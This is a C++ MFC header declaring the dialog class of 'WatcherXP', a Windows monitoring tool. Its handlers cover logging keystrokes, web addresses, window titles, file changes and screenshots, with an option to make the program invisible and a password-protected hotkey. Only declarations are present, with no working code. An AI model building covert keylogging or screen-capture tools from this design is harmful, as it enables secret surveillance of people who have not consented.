// WatcherXPDlg.h : header file
//

#pragma once
#include "options.h"
#include "about.h"
#include "afx.h"
#include "viewer.h"
#include "explorer1.h"
#include "passworddlg.h"
#include "afxwin.h"
#include "myedit.h"
#include "button.h"
#include "xmenu.h"
#include "afxcoll.h"

// CWatcherXPDlg dialog
class CWatcherXPDlg : public CDialog
{
// Construction
public:
	CWatcherXPDlg(CWnd* pParent = NULL);	// standard constructor

// Dialog Data
	enum { IDD = IDD_WATCHERXP_DIALOG };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);	// DDX/DDV support


// Implementation
protected:
	HICON m_hIcon;

	// Generated message map functions
	virtual BOOL OnInitDialog();
	afx_msg void OnPaint();
	afx_msg HCURSOR OnQueryDragIcon();
	DECLARE_MESSAGE_MAP()
public:
	afx_msg UINT OnNcHitTest(CPoint point);
	afx_msg BOOL OnEraseBkgnd(CDC* pDC);
	CExplorer1 explorer;
	afx_msg void OnFileStart();
	afx_msg void OnFileStop();
	afx_msg void OnFileBeinvisible();
	afx_msg void OnUilanguageArabic();
	afx_msg void OnUilanguageEnglish();
	afx_msg void OnFileExit();
	afx_msg void OnViewKeystrokes();
	afx_msg void OnViewWebaddresses();
	afx_msg void OnViewWindowtitles();
	afx_msg void OnViewFilefolderchanges();
	afx_msg void OnViewScreenshots();
	afx_msg void OnViewOptions();
	afx_msg void OnReportKeystrokes();
	afx_msg void OnReportW();
	afx_msg void OnReportWindowtitles();
	afx_msg void OnReportFilefolderchanges();
	afx_msg void OnReportCleardata();
	afx_msg void OnHelpTopics();
	afx_msg void OnHelpAbout();
	CString configPath;
	Options options;
protected:
	virtual void OnCancel();
	virtual void OnOK();
public:
	virtual BOOL DestroyWindow();
	afx_msg void OnClose();
	afx_msg void OnSize(UINT nType, int cx, int cy);
	afx_msg LONG hotKey(WPARAM wParam,LPARAM lparam);

	CString chooseFolder(void);
	void saveConfig(void);
	void loadConfig(void);
	CString encodeString(CString& str);
	CString decodeString(CString& str);

	MyEdit urlControl;
	CString imagePath;
	CString KBPath;
	CString IEPath;
	CString WTPath;
	CString FFPath;
	CString helpPath;
	int hotkey_id;
	PasswordDlg pass;
	Viewer viewer;
	CString getFilePath(CString fileName);
	CString url;
	// GetCurrentDir API returns the user's home when loging in not this process dir
	CString curDir;
	CString getCurrDir(void);
	void initFile(CString path);

	//xmenus
	XMenu menuFileEN;
	XMenu uimEN; //UI submenu
	XMenu menuViewEN;
	XMenu menuReportEN;
	XMenu menuHelpEN;

	XMenu menuFileAR;
	XMenu uimAR;
	XMenu menuViewAR;
	XMenu menuReportAR;
	XMenu menuHelpAR;

	//messages for UI
	CString kbMsg;
	CString ieMsg;
	CString wtMsg;
	CString ffMsg;
	CString regMsg;
	int lang; //language (0 E)(1 AR)
	int pc;// for explorer navigation, page count	
	int cp;// current page


	//menu replacements
	Button fileBtn;
	Button viewBtn;
	Button reportBtn;
	Button helpBtn;

	//the buttons notify the parent window of thier events, so :
	afx_msg void OnFileClick( NMHDR * ns, LRESULT * result );
	afx_msg void OnViewClick( NMHDR * ns, LRESULT * result );
	afx_msg void OnReportClick( NMHDR * ns, LRESULT * result );
	afx_msg void OnHelpClick( NMHDR * ns, LRESULT * result );

	//system menu buttons
	Button maxBtn;
	Button minBtn;
	Button exitBtn;

	afx_msg void OnExitClick( NMHDR * ns, LRESULT * result );
	afx_msg void OnMaxClick( NMHDR * ns, LRESULT * result );
	afx_msg void OnMinClick( NMHDR * ns, LRESULT * result );

	//user window buttons
	Button startBtn;
	Button stopBtn;
	Button hideBtn;
	Button kbBtn;
	Button wtBtn;
	Button ieBtn;
	Button ffBtn;
	Button ssBtn;
	Button optionsBtn;
	Button hBtn;
	Button exBtn;
	Button aboutBtn;

	afx_msg void OnStartClick( NMHDR * ns, LRESULT * result );
	afx_msg void OnStopClick( NMHDR * ns, LRESULT * result );
	afx_msg void OnHideClick( NMHDR * ns, LRESULT * result );
	afx_msg void OnKBClick( NMHDR * ns, LRESULT * result );
	afx_msg void OnWTClick( NMHDR * ns, LRESULT * result );
	afx_msg void OnIEClick( NMHDR * ns, LRESULT * result );
	afx_msg void OnFFClick( NMHDR * ns, LRESULT * result );
	afx_msg void OnSSClick( NMHDR * ns, LRESULT * result );
	afx_msg void OnOptionsClick( NMHDR * ns, LRESULT * result );
	afx_msg void OnUHelpClick( NMHDR * ns, LRESULT * result );
	afx_msg void OnUExitClick( NMHDR * ns, LRESULT * result );
	afx_msg void OnAboutClick( NMHDR * ns, LRESULT * result );

	//idl buttons do nothing, only to complete the form
	Button idl1Btn;
	Button idl2Btn;
	Button idlHeadBtn; //head

	//navigation button
	Button navNextBtn;
	Button navPrevBtn;
	Button navStopBtn;
	Button navRefreshBtn;
	Button navHomeBtn;


	afx_msg void OnNavNextClick( NMHDR * ns, LRESULT * result );
	afx_msg void OnNavPrevClick( NMHDR * ns, LRESULT * result );
	afx_msg void OnNavStopClick( NMHDR * ns, LRESULT * result );
	afx_msg void OnNavRefreshClick( NMHDR * ns, LRESULT * result );
	afx_msg void OnNavHomeClick( NMHDR * ns, LRESULT * result );

	void initMenus();

	void   reportKB(CString path);
	void   reportIEAddress(CString path);
	void   reportFileFolder(CString path);
	void   reportWindowTitle(CString path);

	void   clearData();

	//this list might be emptied many
	LPCTSTR loadStr(UINT id);
	CStringList strList;

	LPCTSTR loadMenuStr(UINT id);
	CStringList menuStrList;

};
